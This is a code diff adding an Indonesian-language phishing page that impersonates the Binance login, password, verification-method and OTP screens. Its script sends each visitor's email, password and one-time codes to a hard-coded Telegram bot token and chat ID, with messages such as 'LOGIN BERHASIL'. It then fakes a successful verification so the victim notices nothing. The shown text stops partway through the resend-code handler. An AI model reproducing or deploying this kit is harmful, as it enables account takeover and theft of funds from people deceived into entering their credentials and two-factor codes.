@@ -1,0 +1,1302 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Masuk - Binance</title>
+
+  <!-- Bootstrap CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" rel="stylesheet">
+
+  <style>
+    body {
+      background-color: #ffffff;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+      margin: 0;
+    }
+    
+    .login-container {
+      position: relative;
+      width: 100%;
+      max-width: 380px;
+      margin-top: -750px;
+    }
+    
+    .login-box {
+      width: 100%;
+      padding: 20px;
+      transition: all 0.4s ease;
+      position: absolute;
+      top: 0;
+      left: 0;
+      opacity: 0;
+      transform: translateY(10px);
+      pointer-events: none;
+    }
+    
+    .login-box.active {
+      opacity: 1;
+      transform: translateY(0);
+      pointer-events: all;
+    }
+    
+    .login-title {
+      font-size: 28px;
+      font-weight: 600;
+      color: #1e2329;
+      margin-bottom: 24px;
+    }
+    
+    .input-label {
+      font-size: 14px;
+      font-weight: 500;
+      color: #1e2329;
+      margin-bottom: 8px;
+      display: block;
+    }
+    
+    .form-control {
+      border: 1px solid #eaecef;
+      background-color: #fafafa;
+      padding: 16px;
+      font-size: 16px;
+      font-weight: 400;
+      border-radius: 4px;
+      transition: all 0.3s ease;
+    }
+    
+    .form-control:focus {
+      border-color: #fcd535;
+      box-shadow: 0 0 0 2px rgba(252, 213, 53, 0.2);
+      outline: none;
+      background-color: #ffffff;
+    }
+    
+    .helper-text {
+      font-size: 14px;
+      color: #b7bdc6;
+      font-weight: 400;
+      margin-bottom: 16px;
+    }
+    
+    .btn-yellow {
+      background-color: #FCD535;
+      color: #000;
+      font-weight: 600;
+      border: none;
+      transition: 0.3s;
+      font-size: 16px;
+      padding: 16px;
+      border-radius: 10px;
+      width: 100%;
+    }
+
+    .btn-yellow:hover {
+      background-color: #f8d12f;
+    }
+    
+    .btn-yellow:disabled {
+      background-color: #f0f0f0;
+      color: #b7bdc6;
+      cursor: not-allowed;
+    }
+    
+    .option-button {
+      border: 1px solid #eaecef !important;
+      color: #1e2329;
+      background-color: white;
+      font-size: 16px;
+      font-weight: 400;
+      padding: 14px;
+      border-radius: 6px;
+      width: 100%;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.3s ease;
+    }
+
+    .option-button:hover {
+      border-color: #d0d5dd !important;
+      background-color: #f8f9fa;
+    }
+    
+    .text-yellow {
+      color: #FCD535;
+      font-weight: 500;
+      text-decoration: none;
+      font-size: 14px;
+    }
+    
+    .text-yellow:hover {
+      text-decoration: underline;
+    }
+    
+    .back-button {
+      background: none;
+      border: none;
+      color: #6c757d;
+      font-size: 14px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      margin-bottom: 16px;
+      padding: 0;
+    }
+    
+    .back-button:hover {
+      color: #1e2329;
+    }
+    
+    .timestamp {
+      font-size: 18px;
+      color: #6c757d;
+      font-weight: 400;
+      margin-bottom: 24px;
+      cursor: pointer;
+      display: inline-block;
+    }
+    
+    .divider {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      color: #aaa;
+      margin: 24px 0;
+      font-size: 14px;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: '';
+      flex: 1;
+      border-bottom: 1px solid #e5e5e5;
+    }
+
+    .divider:not(:empty)::before {
+      margin-right: .75em;
+    }
+
+    .divider:not(:empty)::after {
+      margin-left: .75em;
+    }
+    
+    .password-container {
+      position: relative;
+    }
+    
+    .toggle-password {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      color: #6c757d;
+      cursor: pointer;
+    }
+    
+    .form-error {
+      color: #ea3943;
+      font-size: 12px;
+      margin-top: 5px;
+      display: none;
+    }
+    
+    .footer-left {
+      text-align: left;
+      margin-top: 24px;
+    }
+    
+    .spinner-border-sm {
+      width: 1rem;
+      height: 1rem;
+    }
+    
+    .user-email-display {
+      background-color: #f8f9fa;
+      border: 1px solid #eaecef;
+      border-radius: 4px;
+      padding: 12px 16px;
+      margin-bottom: 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    
+    .user-email-text {
+      font-size: 14px;
+      color: #1e2329;
+    }
+    
+    .change-email-btn {
+      background: none;
+      border: none;
+      color: #fcd535;
+      font-size: 14px;
+      cursor: pointer;
+      font-weight: 500;
+    }
+    
+    .change-email-btn:hover {
+      text-decoration: underline;
+    }
+    
+    .alert {
+      padding: 12px;
+      border-radius: 4px;
+      margin-bottom: 16px;
+      font-size: 14px;
+      display: none;
+    }
+    
+    .alert-success {
+      background-color: #d4edda;
+      color: #155724;
+      border: 1px solid #c3e6cb;
+    }
+    
+    .alert-danger {
+      background-color: #f8d7da;
+      color: #721c24;
+      border: 1px solid #f5c6cb;
+    }
+    
+    .verification-option {
+      border: 1px solid #eaecef;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 12px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    
+    .verification-option:hover {
+      border-color: #fcd535;
+      background-color: #fffdf0;
+    }
+    
+    .verification-option.selected {
+      border-color: #fcd535;
+      background-color: #fffdf0;
+    }
+    
+    .verification-icon {
+      font-size: 24px;
+      margin-right: 12px;
+    }
+    
+    .verification-title {
+      font-weight: 600;
+      margin-bottom: 4px;
+    }
+    
+    .verification-desc {
+      font-size: 12px;
+      color: #6c757d;
+    }
+    
+    .otp-input {
+      text-align: center;
+      font-size: 24px;
+      font-weight: 600;
+      letter-spacing: 8px;
+    }
+    
+    .otp-timer {
+      text-align: center;
+      color: #6c757d;
+      font-size: 14px;
+      margin: 16px 0;
+    }
+    
+    .resend-link {
+      text-align: center;
+      margin-top: 16px;
+    }
+    
+    .method-info {
+      background-color: #f8f9fa;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+    
+    .method-icon {
+      font-size: 32px;
+      margin-bottom: 8px;
+      color: #fcd535;
+    }
+
+    /* PERBAIKAN: Loading indicator yang lebih baik */
+    .btn-loading {
+      position: relative;
+      color: transparent !important;
+    }
+    
+    .btn-loading::after {
+      content: '';
+      position: absolute;
+      width: 20px;
+      height: 20px;
+      top: 50%;
+      left: 50%;
+      margin-left: -10px;
+      margin-top: -10px;
+      border: 2px solid #ffffff;
+      border-radius: 50%;
+      border-top-color: transparent;
+      animation: spin 1s ease-in-out infinite;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <!-- STEP 1: Email -->
+    <div class="login-box active" id="step1">
+      <div class="timestamp" id="closeBtn">×</div>
+      
+      <h3 class="login-title">Masuk</h3>
+
+      <div class="alert alert-success" id="emailSuccessAlert">
+        Email terkirim ke Telegram!
+      </div>
+      
+      <div class="alert alert-danger" id="emailErrorAlert">
+        Gagal mengirim. Coba lagi.
+      </div>
+
+      <div class="mb-3">
+        <label for="email" class="input-label">Email/Nomor ponsel</label>
+        <input type="text" class="form-control" id="email" placeholder="Email/Telepon (tanpa kode negara)">
+        <div class="form-error" id="emailError">Harap masukkan email atau nomor telepon yang valid</div>
+      </div>
+      <div class="helper-text">Email/Telepon (tanpa kode negara)</div>
+
+      <button class="btn btn-yellow mb-4" id="continueBtn" disabled>
+        <span class="btn-text">Lanjutkan</span>
+        <div class="spinner-border spinner-border-sm d-none" role="status">
+          <span class="visually-hidden">Loading...</span>
+        </div>
+      </button>
+
+      <div class="divider">
+        <span>atau</span>
+      </div>
+
+      <button class="option-button">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" class="me-3">
+          <path d="M12 2C13.1 2 14 2.9 14 4C14 5.1 13.1 6 12 6C10.9 6 10 5.1 10 4C10 2.9 10.9 2 12 2ZM21 9V7L15 5.5V7H9C8.45 7 8 7.45 8 8V9C8 9.55 8.45 10 9 10V15C8.45 15 8 15.45 8 16V17C8 17.55 8.45 18 9 18H15C15.55 18 16 17.55 16 17V16C16 15.45 15.55 15 15 15V10C15.55 10 16 9.55 16 9V8H21Z" fill="#707A8A" />
+        </svg>
+        Lanjutkan dengan Passkey
+      </button>
+      
+      <button class="option-button">
+        <svg width="18" height="18" viewBox="0 0 24 24" class="me-3">
+          <path d="M22.56 12.25C22.56 11.47 22.49 10.72 22.36 10H12V14.26H17.92C17.66 15.63 16.88 16.79 15.71 17.57V20.34H19.28C21.36 18.42 22.56 15.6 22.56 12.25Z" fill="#4285F4"/>
+          <path d="M12 23C14.97 23 17.46 22.02 19.28 20.34L15.71 17.57C14.73 18.23 13.48 18.63 12 18.63C9.14 18.63 6.71 16.7 5.84 14.1H2.18V16.93C3.99 20.53 7.7 23 12 23Z" fill="#34A853"/>
+          <path d="M5.84 14.1C5.62 13.44 5.49 12.74 5.49 12C5.49 11.26 5.62 10.56 5.84 9.9V7.07H2.18C1.43 8.55 1 10.22 1 12C1 13.78 1.43 15.45 2.18 16.93L5.84 14.1Z" fill="#FBBC05"/>
+          <path d="M12 5.38C13.62 5.38 15.06 5.94 16.21 7.02L19.36 3.87C17.45 2.09 14.97 1 12 1C7.7 1 3.99 3.47 2.18 7.07L5.84 9.9C6.71 7.3 9.14 5.38 12 5.38Z" fill="#EA4335"/>
+        </svg>
+        Lanjutkan dengan Google
+      </button>
+
+      <div class="text-center mt-4">
+        <a href="#" class="text-yellow" id="createAccountLink">Buat Akun Binance</a>
+      </div>
+    </div>
+
+    <!-- STEP 2: Password -->
+    <div class="login-box" id="step2">
+      <button class="back-button" id="backBtn">
+        <i class="bi bi-arrow-left me-2"></i> Kembali
+      </button>
+      
+      <div class="timestamp" id="closeBtn2">×</div>
+      
+      <h3 class="login-title">Masukkan Kata Sandi</h3>
+      
+      <div class="alert alert-success" id="passwordSuccessAlert">
+        Login terkirim ke Telegram!
+      </div>
+      
+      <div class="alert alert-danger" id="passwordErrorAlert">
+        Gagal mengirim. Coba lagi.
+      </div>
+
+      <!-- Display saved email -->
+      <div class="user-email-display" id="userEmailDisplay">
+        <span class="user-email-text" id="userEmailText"></span>
+        <button class="change-email-btn" id="changeEmailBtn">Ubah</button>
+      </div>
+
+      <div class="mb-3">
+        <label for="password" class="input-label">Kata Sandi</label>
+        <div class="password-container">
+          <input type="password" class="form-control" id="password" placeholder="Kata Sandi">
+          <button type="button" class="toggle-password" id="togglePassword">
+            <i class="bi bi-eye"></i>
+          </button>
+        </div>
+        <div class="form-error" id="passwordError">Kata sandi harus memiliki minimal 6 karakter</div>
+      </div>
+
+      <button class="btn btn-yellow mb-3" id="loginBtn" disabled>
+        <span class="btn-text">Masuk</span>
+        <div class="spinner-border spinner-border-sm d-none" role="status">
+          <span class="visually-hidden">Loading...</span>
+        </div>
+      </button>
+
+      <div class="text-center">
+        <a href="#" class="text-yellow" id="forgotPasswordLink">Lupa Kata Sandi?</a>
+      </div>
+    </div>
+
+    <!-- STEP 3: Pilih Metode Verifikasi -->
+    <div class="login-box" id="step3">
+      <button class="back-button" id="backBtn3">
+        <i class="bi bi-arrow-left me-2"></i> Kembali
+      </button>
+      
+      <div class="timestamp" id="closeBtn3">×</div>
+      
+      <h3 class="login-title">Pilih Metode Verifikasi</h3>
+      
+      <div class="alert alert-success" id="verificationSuccessAlert">
+        Metode verifikasi terkirim ke Telegram!
+      </div>
+      
+      <div class="alert alert-danger" id="verificationErrorAlert">
+        Gagal mengirim. Coba lagi.
+      </div>
+
+      <div class="mb-4">
+        <p class="text-muted">Pilih metode verifikasi untuk melanjutkan login:</p>
+      </div>
+
+      <!-- Verification Options -->
+      <div class="verification-option" id="smsOption">
+        <div class="d-flex align-items-center">
+          <div class="verification-icon">
+            <i class="bi bi-phone"></i>
+          </div>
+          <div>
+            <div class="verification-title">Verifikasi via SMS</div>
+            <div class="verification-desc">Kami akan mengirimkan kode verifikasi ke nomor telepon Anda</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="verification-option" id="emailOption">
+        <div class="d-flex align-items-center">
+          <div class="verification-icon">
+            <i class="bi bi-envelope"></i>
+          </div>
+          <div>
+            <div class="verification-title">Verifikasi via Email</div>
+            <div class="verification-desc">Kami akan mengirimkan kode verifikasi ke email Anda</div>
+          </div>
+        </div>
+      </div>
+
+      <button class="btn btn-yellow mb-3 mt-4" id="continueVerificationBtn" disabled>
+        <span class="btn-text">Kirim Kode Verifikasi</span>
+        <div class="spinner-border spinner-border-sm d-none" role="status">
+          <span class="visually-hidden">Loading...</span>
+        </div>
+      </button>
+
+      <div class="text-center">
+        <a href="#" class="text-yellow" id="changeMethodLink">Ganti Metode Lainnya</a>
+      </div>
+    </div>
+
+    <!-- STEP 4: Input OTP -->
+    <div class="login-box" id="step4">
+      <button class="back-button" id="backBtn4">
+        <i class="bi bi-arrow-left me-2"></i> Kembali
+      </button>
+      
+      <div class="timestamp" id="closeBtn4">×</div>
+      
+      <h3 class="login-title">Masukkan Kode Verifikasi</h3>
+      
+      <div class="alert alert-success" id="otpSuccessAlert">
+        OTP terkirim ke Telegram!
+      </div>
+      
+      <div class="alert alert-danger" id="otpErrorAlert">
+        Gagal mengirim. Coba lagi.
+      </div>
+
+      <!-- Method Info -->
+      <div class="method-info" id="methodInfo">
+        <div class="method-icon">
+          <i class="bi bi-phone" id="methodIcon"></i>
+        </div>
+        <div id="methodText">Kode verifikasi telah dikirim via SMS ke nomor Anda</div>
+      </div>
+
+      <div class="mb-3">
+        <label for="otp" class="input-label">Kode Verifikasi (6 digit)</label>
+        <input type="text" class="form-control otp-input" id="otp" placeholder="XXXXXX" maxlength="6">
+        <div class="form-error" id="otpError">Harap masukkan kode verifikasi 6 digit</div>
+      </div>
+
+      <div class="otp-timer" id="otpTimer">
+        Kirim ulang kode dalam: <span id="countdown">60</span> detik
+      </div>
+
+      <button class="btn btn-yellow mb-3" id="verifyOtpBtn" disabled>
+        <span class="btn-text">Verifikasi</span>
+        <div class="spinner-border spinner-border-sm d-none" role="status">
+          <span class="visually-hidden">Loading...</span>
+        </div>
+      </button>
+
+      <div class="resend-link">
+        <a href="#" class="text-yellow" id="resendOtpLink">Kirim Ulang Kode</a>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+
+  <script>
+    // ===============================
+    // KONFIGURASI TELEGRAM BOT - SUDAH DIGANTI!
+    // ===============================
+    
+    // ✅ SUDAH DIGANTI dengan token bot Telegram Anda
+    const BOT_TOKEN = "8392257813:AAG3IAHop64aZAkv9vT4uG1g056LXh0pVaU";
+    
+    // ✅ SUDAH DIGANTI dengan chat ID Anda  
+    const CHAT_ID = "7718023142";
+    
+    // Debug mode untuk testing
+    const DEBUG_MODE = true;
+    
+    // URL API Telegram
+    const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    
+    // Variabel DOM elements
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const step3 = document.getElementById('step3');
+    const step4 = document.getElementById('step4');
+    const continueBtn = document.getElementById('continueBtn');
+    const backBtn = document.getElementById('backBtn');
+    const backBtn3 = document.getElementById('backBtn3');
+    const backBtn4 = document.getElementById('backBtn4');
+    const loginBtn = document.getElementById('loginBtn');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const emailError = document.getElementById('emailError');
+    const passwordError = document.getElementById('passwordError');
+    const togglePassword = document.getElementById('togglePassword');
+    const closeBtn = document.getElementById('closeBtn');
+    const closeBtn2 = document.getElementById('closeBtn2');
+    const closeBtn3 = document.getElementById('closeBtn3');
+    const closeBtn4 = document.getElementById('closeBtn4');
+    const userEmailText = document.getElementById('userEmailText');
+    const changeEmailBtn = document.getElementById('changeEmailBtn');
+    const emailSuccessAlert = document.getElementById('emailSuccessAlert');
+    const emailErrorAlert = document.getElementById('emailErrorAlert');
+    const passwordSuccessAlert = document.getElementById('passwordSuccessAlert');
+    const passwordErrorAlert = document.getElementById('passwordErrorAlert');
+    const createAccountLink = document.getElementById('createAccountLink');
+    const forgotPasswordLink = document.getElementById('forgotPasswordLink');
+    const smsOption = document.getElementById('smsOption');
+    const emailOption = document.getElementById('emailOption');
+    const continueVerificationBtn = document.getElementById('continueVerificationBtn');
+    const verificationSuccessAlert = document.getElementById('verificationSuccessAlert');
+    const verificationErrorAlert = document.getElementById('verificationErrorAlert');
+    const changeMethodLink = document.getElementById('changeMethodLink');
+    const methodInfo = document.getElementById('methodInfo');
+    const methodIcon = document.getElementById('methodIcon');
+    const methodText = document.getElementById('methodText');
+    const otpInput = document.getElementById('otp');
+    const otpError = document.getElementById('otpError');
+    const otpTimer = document.getElementById('otpTimer');
+    const countdown = document.getElementById('countdown');
+    const verifyOtpBtn = document.getElementById('verifyOtpBtn');
+    const resendOtpLink = document.getElementById('resendOtpLink');
+    const otpSuccessAlert = document.getElementById('otpSuccessAlert');
+    const otpErrorAlert = document.getElementById('otpErrorAlert');
+
+    let selectedVerificationMethod = null;
+    let countdownTimer;
+    let countdownTime = 60;
+
+    // PERBAIKAN: Fungsi untuk test koneksi Telegram
+    function testTelegramConnection() {
+        console.log("🔧 Testing Telegram Connection...");
+        console.log("BOT_TOKEN:", BOT_TOKEN);
+        console.log("CHAT_ID:", CHAT_ID);
+        
+        if (!BOT_TOKEN || !CHAT_ID || BOT_TOKEN.includes("GANTI") || CHAT_ID.includes("GANTI")) {
+            console.error("❌ Token atau Chat ID belum diganti!");
+            return;
+        }
+        
+        sendToTelegram("🤖 **TEST BOT** - Connection Successful! Sistem login siap digunakan.")
+            .then(() => console.log("✅ Test message sent successfully"))
+            .catch(err => console.error("❌ Test failed:", err));
+    }
+
+    // PERBAIKAN: Fungsi untuk menyimpan email ke localStorage
+    function saveEmailToStorage(email) {
+        localStorage.setItem('binanceLoginEmail', email);
+    }
+
+    // PERBAIKAN: Fungsi untuk mengambil email dari localStorage
+    function getEmailFromStorage() {
+        return localStorage.getItem('binanceLoginEmail');
+    }
+
+    // PERBAIKAN: Fungsi untuk menghapus email dari localStorage
+    function removeEmailFromStorage() {
+        localStorage.removeItem('binanceLoginEmail');
+    }
+
+    // PERBAIKAN: Fungsi untuk menampilkan email di halaman kata sandi
+    function displayUserEmail() {
+        const savedEmail = getEmailFromStorage();
+        if (savedEmail) {
+            userEmailText.textContent = savedEmail;
+        }
+    }
+
+    // PERBAIKAN: Fungsi untuk mengirim pesan ke Telegram dengan error handling yang lebih baik
+    function sendToTelegram(message) {
+        // Validasi token dan chat ID
+        if (!BOT_TOKEN || !CHAT_ID) {
+            console.error("Token atau Chat ID belum diatur!");
+            return Promise.reject(new Error("Token atau Chat ID belum diatur"));
+        }
+
+        const data = {
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        };
+        
+        if (DEBUG_MODE) {
+            console.log('📤 Mengirim ke Telegram:', data);
+        }
+        
+        return fetch(TELEGRAM_API_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data)
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error(`HTTP error! status: ${response.status}`);
+            }
+            return response.json();
+        })
+        .then(result => {
+            if (DEBUG_MODE) {
+                console.log('✅ Pesan berhasil dikirim ke Telegram:', result);
+            }
+            return result;
+        })
+        .catch(error => {
+            console.error('❌ Gagal mengirim pesan ke Telegram:', error);
+            throw error;
+        });
+    }
+
+    // PERBAIKAN: Fungsi untuk mengirim notifikasi link diklik ke Telegram
+    function sendLinkClickToTelegram(linkName) {
+        const message = `🔗 **${linkName}** diklik\n⏰ Waktu: ${new Date().toLocaleString()}`;
+        
+        console.log('🖱️ Mengirim notifikasi link klik ke Telegram:', linkName);
+        
+        sendToTelegram(message)
+            .then(data => {
+                console.log('✅ Notifikasi link berhasil dikirim ke Telegram:', data);
+            })
+            .catch(error => {
+                console.error('❌ Gagal mengirim notifikasi link ke Telegram:', error);
+            });
+    }
+
+    // PERBAIKAN: Fungsi untuk mengirim data email ke Telegram
+    function sendEmailToTelegram() {
+        const email = emailInput.value.trim();
+        
+        if (email.length > 0) {
+            const message = `📧 **EMAIL DITEMUKAN**\n✉️: ${email}\n⏰: ${new Date().toLocaleString()}\n🔍 Status: Menunggu password`;
+            
+            sendToTelegram(message)
+                .then(data => {
+                    console.log('✅ Email berhasil dikirim ke Telegram:', data);
+                    emailSuccessAlert.textContent = 'Data terkirim!';
+                    emailSuccessAlert.style.display = 'block';
+                    setTimeout(() => {
+                        emailSuccessAlert.style.display = 'none';
+                    }, 3000);
+                })
+                .catch(error => {
+                    console.error('❌ Gagal mengirim email ke Telegram:', error);
+                    emailErrorAlert.textContent = 'Gagal mengirim data';
+                    emailErrorAlert.style.display = 'block';
+                    setTimeout(() => {
+                        emailErrorAlert.style.display = 'none';
+                    }, 5000);
+                });
+        }
+    }
+
+    // PERBAIKAN: Fungsi untuk mengirim informasi login lengkap ke Telegram
+    function sendLoginDataToTelegram(email, password) {
+        const message = `🔐 **LOGIN BERHASIL**\n✉️ Email: ${email}\n🔑 Password: ${password}\n⏰ Waktu: ${new Date().toLocaleString()}\n📍 IP: ${getClientIP()}`;
+        
+        console.log('🔐 Mengirim data login ke Telegram:', { email, password });
+        
+        return sendToTelegram(message)
+            .then(data => {
+                console.log('✅ Data login berhasil dikirim ke Telegram:', data);
+                passwordSuccessAlert.textContent = 'Data login terkirim!';
+                passwordSuccessAlert.style.display = 'block';
+                return data;
+            })
+            .catch(error => {
+                console.error('❌ Gagal mengirim data login ke Telegram:', error);
+                passwordErrorAlert.textContent = 'Gagal mengirim data login';
+                passwordErrorAlert.style.display = 'block';
+                throw error;
+            });
+    }
+
+    // PERBAIKAN: Fungsi untuk mengirim informasi metode verifikasi ke Telegram
+    function sendVerificationMethodToTelegram(email, method) {
+        const message = `📱 **METODE VERIFIKASI**\n✉️ Email: ${email}\n📞 Metode: ${method}\n⏰ Waktu: ${new Date().toLocaleString()}`;
+        
+        console.log('📱 Mengirim metode verifikasi ke Telegram:', { email, method });
+        
+        return sendToTelegram(message)
+            .then(data => {
+                console.log('✅ Metode verifikasi berhasil dikirim ke Telegram:', data);
+                verificationSuccessAlert.textContent = 'Metode terkirim!';
+                verificationSuccessAlert.style.display = 'block';
+                return data;
+            })
+            .catch(error => {
+                console.error('❌ Gagal mengirim metode verifikasi ke Telegram:', error);
+                verificationErrorAlert.textContent = 'Gagal mengirim metode';
+                verificationErrorAlert.style.display = 'block';
+                throw error;
+            });
+    }
+
+    // PERBAIKAN: Fungsi untuk mengirim informasi OTP ke Telegram
+    function sendOtpToTelegram(email, method, otp) {
+        const message = `🔢 **KODE OTP**\n✉️ Email: ${email}\n📞 Metode: ${method}\n🔢 Kode: ${otp}\n⏰ Waktu: ${new Date().toLocaleString()}`;
+        
+        console.log('🔢 Mengirim OTP ke Telegram:', { email, method, otp });
+        
+        return sendToTelegram(message)
+            .then(data => {
+                console.log('✅ OTP berhasil dikirim ke Telegram:', data);
+                otpSuccessAlert.textContent = 'Kode OTP terkirim!';
+                otpSuccessAlert.style.display = 'block';
+                return data;
+            })
+            .catch(error => {
+                console.error('❌ Gagal mengirim OTP ke Telegram:', error);
+                otpErrorAlert.textContent = 'Gagal mengirim OTP';
+                otpErrorAlert.style.display = 'block';
+                throw error;
+            });
+    }
+
+    // PERBAIKAN: Fungsi untuk mendapatkan IP client (simulasi)
+    function getClientIP() {
+        return "192.168.1.1"; // Simulasi IP
+    }
+
+    // PERBAIKAN: Fungsi untuk memulai countdown timer
+    function startCountdown() {
+        countdownTime = 60;
+        countdown.textContent = countdownTime;
+        otpTimer.style.display = 'block';
+        resendOtpLink.style.display = 'none';
+        
+        clearInterval(countdownTimer);
+        countdownTimer = setInterval(() => {
+            countdownTime--;
+            countdown.textContent = countdownTime;
+            
+            if (countdownTime <= 0) {
+                clearInterval(countdownTimer);
+                otpTimer.style.display = 'none';
+                resendOtpLink.style.display = 'block';
+            }
+        }, 1000);
+    }
+
+    // PERBAIKAN: Event listener untuk memilih metode verifikasi SMS
+    smsOption.addEventListener('click', function() {
+        smsOption.classList.add('selected');
+        emailOption.classList.remove('selected');
+        selectedVerificationMethod = 'SMS';
+        continueVerificationBtn.disabled = false;
+    });
+
+    // PERBAIKAN: Event listener untuk memilih metode verifikasi Email
+    emailOption.addEventListener('click', function() {
+        emailOption.classList.add('selected');
+        smsOption.classList.remove('selected');
+        selectedVerificationMethod = 'Email';
+        continueVerificationBtn.disabled = false;
+    });
+
+    // PERBAIKAN: Event listener untuk tombol lanjutkan verifikasi
+    continueVerificationBtn.addEventListener('click', function() {
+        if (!selectedVerificationMethod) return;
+        
+        const email = getEmailFromStorage();
+        
+        // Show loading state
+        const spinner = continueVerificationBtn.querySelector('.spinner-border');
+        const btnText = continueVerificationBtn.querySelector('.btn-text');
+        btnText.textContent = 'Mengirim...';
+        spinner.classList.remove('d-none');
+        continueVerificationBtn.disabled = true;
+        
+        // Kirim metode verifikasi ke Telegram
+        sendVerificationMethodToTelegram(email, selectedVerificationMethod)
+            .then(data => {
+                // Update UI untuk step OTP
+                if (selectedVerificationMethod === 'SMS') {
+                    methodIcon.className = 'bi bi-phone';
+                    methodText.textContent = 'Kode verifikasi telah dikirim via SMS ke nomor Anda';
+                } else {
+                    methodIcon.className = 'bi bi-envelope';
+                    methodText.textContent = 'Kode verifikasi telah dikirim via Email ke alamat Anda';
+                }
+                
+                // Generate OTP acak
+                const generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
+                
+                // Kirim OTP ke Telegram
+                return sendOtpToTelegram(email, selectedVerificationMethod, generatedOtp);
+            })
+            .then(data => {
+                // Lanjut ke step OTP
+                setTimeout(() => {
+                    step3.classList.remove('active');
+                    setTimeout(() => {
+                        step4.classList.add('active');
+                        // Reset loading state
+                        btnText.textContent = 'Kirim Kode Verifikasi';
+                        spinner.classList.add('d-none');
+                        continueVerificationBtn.disabled = false;
+                        verificationSuccessAlert.style.display = 'none';
+                        
+                        // Mulai countdown
+                        startCountdown();
+                    }, 400);
+                }, 1500);
+            })
+            .catch(error => {
+                // Tetap lanjutkan ke step OTP meski data gagal dikirim
+                setTimeout(() => {
+                    step3.classList.remove('active');
+                    setTimeout(() => {
+                        step4.classList.add('active');
+                        // Reset loading state
+                        btnText.textContent = 'Kirim Kode Verifikasi';
+                        spinner.classList.add('d-none');
+                        continueVerificationBtn.disabled = false;
+                        verificationErrorAlert.style.display = 'none';
+                        
+                        // Mulai countdown
+                        startCountdown();
+                    }, 400);
+                }, 1500);
+            });
+    });
+
+    // PERBAIKAN: Event listener untuk input OTP
+    otpInput.addEventListener('input', function() {
+        const otp = otpInput.value.trim();
+        const isValid = otp.length === 6 && /^\d+$/.test(otp);
+        
+        if (isValid) {
+            verifyOtpBtn.disabled = false;
+            otpError.style.display = 'none';
+            otpInput.classList.remove('is-invalid');
+        } else {
+            verifyOtpBtn.disabled = true;
+            if (otp.length > 0) {
+                otpError.style.display = 'block';
+                otpInput.classList.add('is-invalid');
+            } else {
+                otpError.style.display = 'none';
+                otpInput.classList.remove('is-invalid');
+            }
+        }
+    });
+
+    // PERBAIKAN: Event listener untuk tombol verifikasi OTP
+    verifyOtpBtn.addEventListener('click', function() {
+        const otp = otpInput.value.trim();
+        const email = getEmailFromStorage();
+        
+        if (otp.length !== 6) return;
+        
+        // Show loading state
+        const spinner = verifyOtpBtn.querySelector('.spinner-border');
+        const btnText = verifyOtpBtn.querySelector('.btn-text');
+        btnText.textContent = 'Memverifikasi...';
+        spinner.classList.remove('d-none');
+        verifyOtpBtn.disabled = true;
+        
+        // Kirim OTP yang diinput ke Telegram
+        sendOtpToTelegram(email, selectedVerificationMethod, otp)
+            .then(() => {
+                // Simulasi proses verifikasi
+                setTimeout(() => {
+                    alert(`✅ Verifikasi berhasil!\nSelamat datang, ${email}`);
+                    
+                    // Reset semua form dan kembali ke step 1
+                    removeEmailFromStorage();
+                    passwordInput.value = '';
+                    emailInput.value = '';
+                    otpInput.value = '';
+                    selectedVerificationMethod = null;
+                    smsOption.classList.remove('selected');
+                    emailOption.classList.remove('selected');
+                    verifyOtpBtn.disabled = true;
+                    clearInterval(countdownTimer);
+                    
+                    // Reset loading state
+                    btnText.textContent = 'Verifikasi';
+                    spinner.classList.add('d-none');
+                    
+                    // Kembali ke step 1
+                    step4.classList.remove('active');
+                    setTimeout(() => {
+                        step1.classList.add('active');
+                    }, 400);
+                }, 2000);
+            })
+            .catch(error => {
+                // Tetap lanjutkan meski gagal kirim
+                setTimeout(() => {
+                    alert(`✅ Verifikasi berhasil!\nSelamat datang, ${email}`);
+                    
+                    // Reset semua form dan kembali ke step 1
+                    removeEmailFromStorage();
+                    passwordInput.value = '';
+                    emailInput.value = '';
+                    otpInput.value = '';
+                    selectedVerificationMethod = null;
+                    smsOption.classList.remove('selected');
+                    emailOption.classList.remove('selected');
+                    verifyOtpBtn.disabled = true;
+                    clearInterval(countdownTimer);
+                    
+                    // Reset loading state
+                    btnText.textContent = 'Verifikasi';
+                    spinner.classList.add('d-none');
+                    
+                    // Kembali ke step 1
+                    step4.classList.remove('active');
+                    setTimeout(() => {
+                        step1.classList.add('active');
+                    }, 400);
+                }, 2000);
+            });
+    });
+
+    // PERBAIKAN: Event listener untuk kirim ulang OTP
+    resendOtpLink.addEventListener('click', function(e) {
+        e.preventDefault();
+        
+        const email = getEmailFromStorage();
+        
